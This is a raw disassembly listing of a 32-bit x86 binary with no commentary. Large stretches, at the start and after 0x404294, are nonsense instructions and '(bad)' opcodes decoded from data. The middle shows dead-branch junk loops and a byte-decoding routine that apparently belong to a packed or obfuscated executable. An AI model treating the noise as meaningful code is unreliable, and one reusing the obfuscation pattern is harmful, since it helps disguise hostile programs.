  403ac0:	sar    eax,0x52
  403ac3:	jmp    0x403ae0
  403ac5:	scas   al,BYTE PTR es:[edi]
  403ac6:	xchg   ecx,eax
  403ac7:	push   es
  403ac8:	xchg   ecx,eax
  403ac9:	mov    esp,0x2ff643e1
  403ace:	je     0x403ae8
  403ad0:	iret   
  403ad1:	int    0xb2
  403ad3:	(bad)  
  403ad5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403ad7:	ins    BYTE PTR es:[edi],dx
  403ad8:	imul   edx,DWORD PTR [ebx-0x21fbb542],0x826ae347
  403ae2:	sub    DWORD PTR [esp+eiz*8-0x2e2bd56d],ebp
  403ae9:	out    0x96,al
  403aeb:	out    dx,al
  403aec:	mov    ebp,0xe26cb7e9
  403af1:	xor    ebx,DWORD PTR [ecx]
  403af3:	push   0x5d
  403af5:	push   ecx
  403af6:	std    
  403af7:	pop    ecx
  403af8:	mov    al,0xa4
  403afa:	nop
  403afb:	jmp    0xfe1b20c
  403b00:	sub    eax,DWORD PTR [edx+eiz*1-0x310349a]
  403b07:	call   0xbf40923a
  403b0c:	mov    eax,0xcf6dd13f
  403b11:	dec    ecx
  403b12:	(bad)  
  403b13:	xor    edx,DWORD PTR [ebx]
  403b15:	or     DWORD PTR [ebx-0x63],esi
  403b18:	test   ebx,ecx
  403b1a:	xchg   DWORD PTR [edx+0x117409e8],esp
  403b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b21:	popf   
  403b22:	sub    DWORD PTR [eax+esi*4-0x115ee3a3],0x61
  403b2a:	cs mov edx,ds
  403b2d:	cmp    al,0x33
  403b2f:	add    ebp,edx
  403b31:	loopne 0x403b38
  403b33:	fild   DWORD PTR [edi+0x79d29b24]
  403b39:	push   ss
  403b3a:	mov    ebp,0x8f6d0a4f
  403b3f:	dec    edx
  403b40:	(bad)  
  403b42:	pop    eax
  403b43:	jmp    FWORD PTR [ebx+0x46bb467e]
  403b49:	mov    es,WORD PTR [eax+eax*1-0x736ae8fb]
  403b50:	mov    esp,0xc2ad7f30
  403b55:	stos   BYTE PTR es:[edi],al
  403b56:	lock jmp 0xa7b8:0xea3620d
  403b5e:	xor    eax,0x192f515c
  403b63:	in     al,dx
  403b64:	(bad)  
  403b66:	sbb    BYTE PTR gs:[ebx+0x61],dh
  403b6a:	mov    BYTE PTR [esp+eiz*4-0x4e2f450d],dl
  403b71:	popf   
  403b72:	mov    dh,0x4b
  403b74:	and    eax,0xc90f1861
  403b79:	bound  eax,QWORD PTR [edi+ebp*2]
  403b7c:	lods   al,BYTE PTR ds:[esi]
  403b7d:	nop
  403b7e:	mov    ds:0xad4b367e,eax
  403b83:	inc    ecx
  403b84:	add    DWORD PTR [ebx+0x2b],0xe718eada
  403b8b:	out    0xd4,eax
  403b8d:	and    edx,DWORD PTR ds:0x76dc71ee
  403b93:	out    0x4d,eax
  403b95:	mov    bh,0x6c
  403b97:	fisubr DWORD PTR [ebx]
  403b99:	sub    eax,0xbe64eae4
  403b9e:	mov    edx,0x7e07feed
  403ba3:	shr    eax,1
  403ba5:	push   ecx
  403ba6:	fwait
  403ba7:	(bad)  
  403ba8:	scas   eax,DWORD PTR es:[edi]
  403ba9:	jl     0x403c0e
  403bab:	push   edi
  403bac:	jle    0x403bd7
  403bae:	add    ah,BYTE PTR [ecx]
  403bb0:	xchg   esi,eax
  403bb1:	call   0xddeb:0xa382b35a
  403bb8:	xchg   ebx,eax
  403bb9:	inc    eax
  403bba:	sub    eax,0x96c12907
  403bbf:	shr    DWORD PTR [edx+0x3a],0x30
  403bc3:	jl     0x403b73
  403bc5:	or     edi,DWORD PTR [edx-0x50e3884b]
  403bcb:	mov    WORD PTR [eax],ds
  403bcd:	pop    ebx
  403bce:	mov    bl,BYTE PTR [ecx]
  403bd0:	iret   
  403bd1:	or     ebx,DWORD PTR [ebx-0x4a]
  403bd4:	ror    BYTE PTR [edx],0xab
  403bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bd8:	outs   dx,BYTE PTR ds:[esi]
  403bd9:	aam    0xa5
  403bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bdc:	jnp    0x403c43
  403bde:	sbb    BYTE PTR [ebp+0x7fa92dc0],al
  403be4:	leave  
  403be5:	mov    edi,0x6bc5653e
  403bea:	pushf  
  403beb:	call   0xcdbfc517
  403bf0:	clc    
  403bf1:	fild   QWORD PTR [edx]
  403bf3:	add    BYTE PTR [ebx+0x143495],ch
  403bf9:	dec    DWORD PTR [eax+0x4b206694]
  403bff:	aas    
  403c00:	cmp    BYTE PTR [eax],dh
  403c02:	cmp    ch,al
  403c04:	jno    0x403c04
  403c06:	cmp    eax,0x582724a
  403c0b:	rcl    BYTE PTR [edi-0x54],0xfa
  403c0f:	rol    BYTE PTR [eax+0x52],cl
  403c12:	outs   dx,BYTE PTR ds:[esi]
  403c13:	repz daa 
  403c15:	add    BYTE PTR [esp+eax*2],cl
  403c18:	inc    ecx
  403c19:	jecxz  0x403c39
  403c1b:	pop    esp
  403c1c:	dec    ebx
  403c1d:	pop    ebx
  403c1e:	or     eax,DWORD PTR [esi-0x23]
  403c21:	in     al,dx
  403c22:	in     eax,0xe0
  403c24:	aas    
  403c25:	imul   eax,DWORD PTR [edx+0x50],0x103a2652
  403c2c:	push   eax
  403c2d:	push   0x847c8795
  403c32:	jge    0x403c51
  403c34:	pop    edx
  403c35:	xchg   ebp,eax
  403c36:	scas   eax,DWORD PTR es:[edi]
  403c37:	xchg   ebp,eax
  403c38:	fimul  DWORD PTR [ebx-0x42286df9]
  403c3e:	int    0x62
  403c40:	or     DWORD PTR [eax-0x25242c95],ebp
  403c46:	and    bl,bh
  403c48:	jg     0x403c8c
  403c4a:	test   al,0x8b
  403c4c:	out    0x35,eax
  403c4e:	loop   0x403c93
  403c50:	shl    DWORD PTR [ebx-0x23],cl
  403c53:	inc    ebx
  403c54:	bound  ecx,QWORD PTR [esi-0x59]
  403c57:	pushf  
  403c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c59:	mov    ch,0xff
  403c5b:	es xor bl,bl
  403c5e:	and    dl,BYTE PTR [esi-0x6f08b3f6]
  403c64:	adc    DWORD PTR [esi],esi
  403c66:	sub    al,0xd9
  403c68:	lds    esi,FWORD PTR [edx+ecx*8]
  403c6b:	das    
  403c6c:	xor    eax,0xb0b8ae69
  403c71:	mov    ecx,0x65b700f5
  403c76:	jae    0x403ca2
  403c78:	or     BYTE PTR [ecx-0x3732c756],0x20
  403c7f:	jg     0x403cb4
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x429000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x427018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x425004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x425004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x425004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x421020
  403d26:	mov    edx,DWORD PTR ds:0x425004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x425004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x426018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x428014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x428014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x428014,ecx
  403d68:	cmp    DWORD PTR ds:0x428014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x428014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x421028
  403d93:	cmp    DWORD PTR ds:0x428014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x428014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x428014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x425000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x426000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x429014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x429014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x429014,esi
  403de0:	cmp    DWORD PTR ds:0x429014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x41ff1f
  403df2:	call   DWORD PTR ds:0x42102c
  403df8:	cmp    DWORD PTR ds:0x429014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x429014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x429014,esi
  403e12:	cmp    DWORD PTR ds:0x429014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x429008
  403e26:	sub    DWORD PTR ds:0x42900c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x42601c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x42700c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x425000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x42601c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x42601c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x42801c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x429018,0x427000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42501c,0x427004
  403f69:	call   DWORD PTR ds:0x421044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x426000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x421010
  403f84:	and    DWORD PTR ds:0x42600c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x42600c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x42600c,ecx
  403f9b:	cmp    DWORD PTR ds:0x42600c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x421030
  403fda:	cmp    DWORD PTR ds:0x42600c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x428010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x42701c,0x426014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x427004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x428010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x428010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x428010,ecx
  404040:	cmp    DWORD PTR ds:0x428010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x428010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x42801c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x421058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x426004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x425024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x429000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x429008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x427010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x42600c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x425008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x42601c,0x16
  4040e7:	cmp    DWORD PTR ds:0x42601c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x42601c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x425014
  404106:	push   0x426014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42105c
  404114:	mov    esi,DWORD PTR ds:0x42601c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x42601c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x425014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x425008
  404138:	sbb    DWORD PTR ds:0x426008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x428010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x428008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x42801c
  404161:	sbb    DWORD PTR ds:0x429004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x426000,0x1b
  404176:	cmp    DWORD PTR ds:0x426000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x426000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x425014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x421034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x426000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x426000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x425014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x426000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x42700c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x42700c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x42700c,ecx
  4041e8:	cmp    DWORD PTR ds:0x42700c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x421038
  404203:	cmp    DWORD PTR ds:0x42700c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x426018,0x19
  40421c:	cmp    DWORD PTR ds:0x426018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x426018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x428008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x421000
  404251:	cmp    DWORD PTR ds:0x426018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x426018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x426018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x426018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x426018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x428008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x429008,0x427008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0xcd9c947b
  4042a6:	pusha  
  4042a7:	jnp    0x404294
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx+0x5b]
  4042b2:	loope  0x404329
  4042b4:	dec    eax
  4042b5:	mov    edi,0xcd44b115
  4042ba:	ret    
  4042bb:	and    esp,esi
  4042bd:	(bad)  
  4042bf:	cmc    
  4042c0:	jmp    0x6d17a1b1
  4042c5:	jo     0x4042e7
  4042c7:	adc    al,0x41
  4042c9:	fidivr DWORD PTR [esi-0x1e685f5a]
  4042cf:	mov    esp,0x899395e3
  4042d4:	imul   edi,esi,0xfde3ddc
  4042da:	sbb    esp,ecx
  4042dc:	stos   DWORD PTR es:[edi],eax
  4042dd:	xlat   BYTE PTR ds:[ebx]
  4042de:	adc    DWORD PTR [edx],ebx
  4042e0:	and    al,0x9
  4042e2:	rol    ecx,cl
  4042e4:	ficomp WORD PTR [edi]
  4042e6:	(bad)  
  4042e7:	sar    DWORD PTR [ebx],cl
  4042e9:	out    dx,eax
  4042ea:	or     BYTE PTR [eax+0x62b2052c],dl
  4042f0:	pop    ecx
  4042f1:	push   0x62
  4042f3:	pop    ds
  4042f4:	(bad)  
  4042f5:	popa   
  4042f6:	mov    ds:0x29075aa7,eax
  4042fb:	jb     0x4042e8
  4042fd:	aam    0xfa
  4042ff:	mov    WORD PTR [edi+0x71],?
  404302:	into   
  404303:	mov    ds:0x3cecc233,al
  404308:	out    dx,eax
  404309:	popf   
  40430a:	sub    BYTE PTR [ecx],ch
  40430c:	and    edi,DWORD PTR ds:0xddab938f
  404312:	push   ds
  404313:	xor    DWORD PTR [ebp+0x293f65d5],ebp
  404319:	imul   ebx,DWORD PTR [ebx-0x10264880],0xffffff90
  404320:	inc    esp
  404321:	jb     0x4042be
  404323:	or     bl,BYTE PTR [eax]
  404325:	shr    al,0xa9
  404328:	mov    bh,0x89
  40432a:	pop    edx
  40432b:	jnp    0x40430c
  40432d:	in     al,0xc4
  40432f:	rcr    BYTE PTR [esi+0x7b8e726b],1
  404335:	(bad)  
  404336:	std    
  404337:	lock arpl si,bp
  40433a:	push   0xbeebe44
  40433f:	aaa    
  404340:	xor    al,ch
  404342:	mul    BYTE PTR [edi+0x35]
  404345:	imul   BYTE PTR [esi+0x3a56ff77]
  40434b:	aad    0xba
  40434d:	ret    
  40434e:	sub    eax,0xfd9c439d
  404353:	int3   
  404354:	clc    
  404355:	int    0xc
  404357:	push   ebp
  404358:	push   eax
  404359:	in     eax,dx
  40435a:	arpl   WORD PTR [esi-0x7e],dx
  40435d:	xchg   edx,eax
  40435e:	add    dl,ah
  404360:	outs   dx,DWORD PTR ds:[esi]
  404361:	out    dx,eax
  404362:	sbb    ebp,esp
  404364:	(bad)  
  404365:	mov    edx,0x835a8a8d
  40436a:	inc    edi
  40436b:	idiv   DWORD PTR [ecx-0x67431853]
  404371:	pusha  
  404372:	retf   
  404373:	aas    
  404374:	inc    ebp
  404375:	xor    BYTE PTR cs:[ebp-0xc0595eb],dl
  40437c:	mov    ch,0xdd
  40437e:	xor    ebp,esi
  404380:	sbb    DWORD PTR [ebx],0xffffffc9
  404383:	push   esi
  404384:	imul   eax,DWORD PTR [esi-0x4f69b690],0xf4319972
  40438e:	clc    
  40438f:	jmp    0x66d6:0xcdd89a5b
  404396:	ja     0x40434c
  404398:	mov    bh,0xea
  40439a:	rcr    DWORD PTR [eax-0x34fc78ae],cl
  4043a0:	ret    
  4043a1:	add    esi,DWORD PTR [eax+0x26]
  4043a4:	imul   edx,DWORD PTR [edi],0x56
  4043a7:	loopne 0x40438d
  4043a9:	dec    esp
  4043aa:	jp     0x40433b
  4043ac:	call   0x5414:0x967ec74d
  4043b3:	outs   dx,DWORD PTR ds:[esi]
  4043b4:	and    DWORD PTR [ecx+0x53],edi
  4043b7:	fnsave [ebx-0x78]
  4043ba:	cwde   
  4043bb:	call   0xec5d95d2
  4043c0:	in     eax,dx
  4043c1:	push   esp
  4043c2:	jns    0x404369
  4043c4:	jmp    0x8cff:0x42134db7
  4043cb:	call   0x903b7201
  4043d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d1:	jbe    0x404367
  4043d3:	dec    edi
  4043d4:	call   0xa8268a0e
  4043d9:	(bad)
  4043dc:	xlat   BYTE PTR ds:[ebx]
  4043dd:	xchg   esp,eax
  4043de:	push   edx
  4043df:	xor    eax,ecx
  4043e1:	jb     0x404386
  4043e3:	jae    0x40438d
  4043e5:	inc    ebp
  4043e6:	jbe    0x404410
  4043e8:	fist   DWORD PTR [ebx+0x3a]
  4043eb:	mov    al,0x97
  4043ed:	adc    ebx,DWORD PTR [eax+0x6fe1927b]
  4043f3:	pop    ds
  4043f4:	xchg   edx,eax
  4043f5:	or     eax,0x1050f784
  4043fa:	sub    DWORD PTR [ecx+0x3e5145e],esi
  404400:	in     al,0xee
  404402:	out    dx,al
  404403:	and    ecx,esi
  404405:	je     0x40440e
  404407:	mov    bl,0x55
  404409:	jmp    0x9856fbef
  40440e:	(bad)  
  40440f:	push   ebx
  404410:	cs or  bh,bl
  404413:	(bad)  
  404414:	outs   dx,DWORD PTR ds:[esi]
  404415:	xor    DWORD PTR [edx-0x1c4544fc],esp
  40441b:	shl    DWORD PTR [edx+0x794a738],cl
  404421:	add    al,0x3c
  404423:	xor    eax,0x4bc707d4
  404428:	sahf   
  404429:	sbb    ah,BYTE PTR ds:0xfaf99e5b
  40442f:	iret   
  404430:	inc    ebx
  404431:	push   es
  404432:	ret    
  404433:	mov    eax,ds:0xb6476941
  404438:	addr16 lock push edx
  40443b:	pusha  
  40443c:	or     DWORD PTR [eax-0x5424bac8],ecx
  404442:	test   eax,0x91fc9d55
  404447:	daa    
  404448:	dec    ebp
  404449:	add    al,0x4f
  40444b:	cmp    eax,0x579f7780
  404450:	inc    esi
  404451:	in     al,0x4e
  404453:	retf   
  404454:	sub    ah,ch
  404456:	bound  esi,QWORD PTR [esi-0x37]
  404459:	mov    ebx,0x2b415f48
  40445e:	imul   ecx,DWORD PTR [ebx],0x29
  404461:	dec    edx
  404462:	push   ebx
  404463:	xor    esi,DWORD PTR [ebx-0x6342c6ee]
  404469:	dec    ebx
  40446a:	dec    ebx
  40446b:	out    0xa2,eax
  40446d:	popf   
  40446e:	shr    BYTE PTR [edi],cl
  404470:	es dec ebp
  404472:	test   DWORD PTR [edi+0x4c74ecf],esp
  404478:	push   0xffffffdb
  40447a:	aas    
  40447b:	sub    eax,0x60aa4f2c
  404480:	xchg   edx,edi
  404482:	mov    ds:0x53d067fe,eax
  404487:	pop    esi
  404488:	test   ebx,0xe20f2706
  40448e:	cmp    eax,0xc7f0e703
  404493:	cwde   
  404494:	dec    ebp
  404495:	test   DWORD PTR [ebx-0x5060197c],esi
  40449b:	and    ebx,DWORD PTR ds:0xc677449d
  4044a1:	push   0x6c7902b1
  4044a6:	cwde   
  4044a7:	lea    ebx,[edi+ecx*1+0x39]
  4044ab:	jae    0x404487
  4044ad:	(bad)  
  4044ae:	adc    al,0x51
  4044b0:	mov    esi,0x793195c9
  4044b5:	out    dx,eax
  4044b6:	mov    al,0xa3
  4044b8:	cmovs  esi,ebx
  4044bb:	stos   BYTE PTR es:[edi],al
  4044bc:	push   ss
  4044bd:	xchg   esp,eax
  4044be:	rcr    DWORD PTR [edx+ecx*1],1
  4044c1:	ins    BYTE PTR es:[edi],dx
  4044c2:	les    esp,FWORD PTR [esi]
  4044c4:	xor    dl,ch
  4044c6:	mov    eax,ds:0xdf5aab42
  4044cb:	inc    esi
  4044cc:	not    BYTE PTR [ebx-0x7e00d36a]
  4044d2:	xchg   edi,eax
  4044d3:	mov    WORD PTR [ecx+edx*4+0x72],?
  4044d7:	daa    
  4044d8:	mov    al,ds:0x6c711a26
  4044dd:	and    DWORD PTR [ecx-0x4f1620d5],0xb9367f8c
  4044e7:	loope  0x404510
  4044e9:	cmp    al,0xb5
  4044eb:	fmul   DWORD PTR ds:0x5e0982ed
  4044f1:	jne    0x404565
  4044f3:	cld    
  4044f4:	mov    ds:0x78e9a51d,eax
  4044f9:	iret   
  4044fa:	imul   esp,DWORD PTR [esi+0x34],0x2ce25947
  404501:	push   esp
  404502:	xor    DWORD PTR [eax+0x1c],esp
  404505:	shl    DWORD PTR [ebx+0x57c3b8a3],1
  40450b:	xchg   esp,eax
  40450c:	aam    0x59
  40450e:	mov    ds:0xce276ee0,al
  404513:	fs mov edi,edx
  404516:	lods   al,BYTE PTR ds:[esi]
